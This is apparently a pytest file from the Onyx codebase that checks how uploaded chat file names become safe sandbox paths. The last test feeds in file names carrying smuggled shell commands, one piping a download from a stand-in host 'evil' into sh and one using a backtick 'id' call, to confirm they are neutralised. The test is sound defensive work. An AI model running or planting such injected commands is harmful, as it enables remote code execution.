"""The paths of a chat's files in its sandbox (`chat/files.py`)."""

import os
from uuid import uuid4

import pytest

from onyx.chat.files import place_chat_files
from onyx.chat.models import ContextUserFiles
from onyx.db.models import UserFile
from onyx.server.features.build.sandbox.harness_base import chat_file_name
from onyx.tools.tool_implementations.python.python_tool import (
    CODE_INTERPRETER_FILENAME_MAX_LENGTH,
    _safe_code_interpreter_filename,
)

_FILE_ID = "3f2a9c1e-0b4d-4e5f-8a6b-7c8d9e0f1a2b"


def _user_file(name: str | None, file_id: str = _FILE_ID) -> UserFile:
    return UserFile(id=uuid4(), file_id=file_id, name=name)


def _upload_path(name: str | None, file_id: str = _FILE_ID) -> str:
    [chat_file] = place_chat_files(
        [_user_file(name, file_id)], ContextUserFiles(project=[], agent=[])
    ).files
    assert chat_file.file_id == file_id
    return chat_file.path


def test_a_path_is_the_file_id_prefix_and_the_clean_name() -> None:
    assert _upload_path("report.pdf") == "attachments/3f2a9c1e-report.pdf"
    assert _upload_path("café.txt") == "attachments/3f2a9c1e-café.txt"
    assert _upload_path("a\nb\x07\x7f.txt") == "attachments/3f2a9c1e-a_b__.txt"
    assert _upload_path("dir/x\ty.csv") == "attachments/3f2a9c1e-x_y.csv"


def test_a_file_without_a_usable_name_takes_its_id() -> None:
    assert _upload_path(None) == f"attachments/3f2a9c1e-{_FILE_ID}"
    assert _upload_path("..", "store/x\ny") == "attachments/e-x_y"


def test_a_name_fits_255_bytes_and_200_characters_with_its_prefix() -> None:
    name = _upload_path("é" * 300 + ".pdf").removeprefix("attachments/")
    assert len(name.encode()) <= 255
    assert name.startswith("3f2a9c1e-é")
    assert name.endswith("é.pdf")
    assert _upload_path("a" * 300 + ".pdf") == (
        "attachments/3f2a9c1e-" + "a" * 187 + ".pdf"
    )


def test_a_name_ends_without_whitespace_or_dots() -> None:
    assert _upload_path("notes. . ") == "attachments/3f2a9c1e-notes"
    assert _upload_path("report.pdf.") == "attachments/3f2a9c1e-report.pdf"
    assert _upload_path("x" + " " * 300) == "attachments/3f2a9c1e-x"
    assert _upload_path("..." + "\u3000") == f"attachments/3f2a9c1e-{_FILE_ID}"
    # The cut leaves only dots or spaces, so the name falls back to the file ID.
    assert _upload_path("." * 300 + "x") == f"attachments/3f2a9c1e-{_FILE_ID}"
    assert _upload_path(" " * 250 + "x") == f"attachments/3f2a9c1e-{_FILE_ID}"


@pytest.mark.parametrize(
    "name",
    [
        "Q2: revenue.csv",
        "notes.",
        "notes ",
        "a:b. .",
        "a" * 300 + ".xlsx",
        "a" * 199 + " " * 10 + ".csv",
        "é" * 300 + ".pptx",
        "日本語のファイル" * 40 + ".docx",
        "😀" * 250 + ".md",
        "b" * 150 + "." + "c" * 150,
        "x" + "\u00a0" * 300,
        "..",
        "." + "x" * 300,
        None,
    ],
    ids=lambda name: repr(name)[:24],
)
@pytest.mark.parametrize("file_id", [_FILE_ID, "store/no-hex-digits"])
def test_the_python_tool_stages_a_chat_file_name_unchanged(
    name: str | None, file_id: str
) -> None:
    file_name = chat_file_name(file_id, name)
    assert _safe_code_interpreter_filename(file_name) == file_name
    assert len(file_name) <= CODE_INTERPRETER_FILENAME_MAX_LENGTH
    assert len(file_name.encode()) <= 255
    if name and name.endswith((".xlsx", ".csv", ".pptx", ".docx", ".md")):
        assert file_name.endswith(os.path.splitext(name)[1])


def test_a_long_run_of_spaces_and_dots_takes_linear_time() -> None:
    """Names come from connector titles of any length."""
    name = "a" + ". " * 25_000 + "b" + " ." * 25_000
    assert chat_file_name(_FILE_ID, name) == ("3f2a9c1e-a" + ". " * 93 + ".. b")


def test_paths_depend_on_the_file_alone() -> None:
    """Files of one name get their own paths, and a file keeps its path
    whatever else the chat has."""
    other_id = "9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d"
    first, other = _user_file("plan.md"), _user_file("plan.md", other_id)
    alone = place_chat_files([first], ContextUserFiles(project=[], agent=[])).files
    both = place_chat_files(
        [other, first], ContextUserFiles(project=[], agent=[])
    ).files
    assert [(each.file_id, each.path) for each in both] == [
        (other_id, "attachments/9a8b7c6d-plan.md"),
        (_FILE_ID, "attachments/3f2a9c1e-plan.md"),
    ]
    assert alone == both[1:]


def test_project_and_agent_files_get_their_directories() -> None:
    upload, project, agent = (
        _user_file("a.txt", f"{index:08x}-0000-4000-8000-000000000000")
        for index in range(3)
    )
    placed = place_chat_files(
        [upload], ContextUserFiles(project=[project], agent=[agent])
    )
    assert [(each.file_id, each.path) for each in placed.files] == [
        (upload.file_id, "attachments/00000000-a.txt"),
        (project.file_id, "attachments/project/00000001-a.txt"),
        (agent.file_id, "attachments/agent/00000002-a.txt"),
    ]
    assert placed.upload_paths == {upload.file_id: "attachments/00000000-a.txt"}


def test_a_name_keeps_no_character_that_a_shell_reads() -> None:
    """The model uses the paths in commands, inside double quotes."""
    assert (
        _upload_path("$(curl -s evil|sh) Q2:3.csv")
        == "attachments/3f2a9c1e-__curl -s evil_sh_ Q2_3.csv"
    )
    assert _upload_path("`id`;'x'\"y\"&!*?[]{}~#<>.txt") == (
        "attachments/3f2a9c1e-_id___x__y_____________.txt"
    )
    assert _upload_path("Résumé – v2.pdf") == "attachments/3f2a9c1e-Résumé – v2.pdf"
